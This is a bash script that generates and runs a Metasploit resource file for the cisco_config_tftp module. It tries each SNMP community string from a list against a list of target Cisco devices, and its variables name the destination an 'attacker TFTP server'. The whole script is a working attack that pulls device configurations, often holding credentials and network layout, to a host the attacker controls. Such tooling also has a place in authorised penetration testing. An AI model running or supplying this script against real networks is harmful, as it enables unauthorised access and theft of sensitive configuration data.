# File paths and variables
RC_FILE="cisco_tftp.rc"       
TARGET_FILE="<path to list of targets>"        
COMMUNITY_FILE="<path to list of community strings>"   
TFTP_SERVER="<IP address of attacker TFTP server>"             
OUTPUT_DIR="<path to save incoming configuration files>"             

# Step 1: Generate the RC file
echo "use auxiliary/scanner/snmp/cisco_config_tftp" > $RC_FILE
echo "set RHOSTS file:$TARGET_FILE" >> $RC_FILE
echo "set LHOST $TFTP_SERVER" >> $RC_FILE
echo "set OUTPUTDIR $OUTPUT_DIR" >> $RC_FILE
echo "set THREADS <# of threads>" >> $RC_FILE
echo "set VERSION <1 or 2c>" >> $RC_FILE

# Step 2: Add commands for each community string
while IFS= read -r community; do
    echo "set COMMUNITY $community" >> $RC_FILE
    echo "run" >> $RC_FILE
done < $COMMUNITY_FILE

# Step 3: Add exit command to close Metasploit
echo "exit" >> $RC_FILE

# Step 4: Run Metasploit with the generated RC file
msfconsole -q -r $RC_FILE
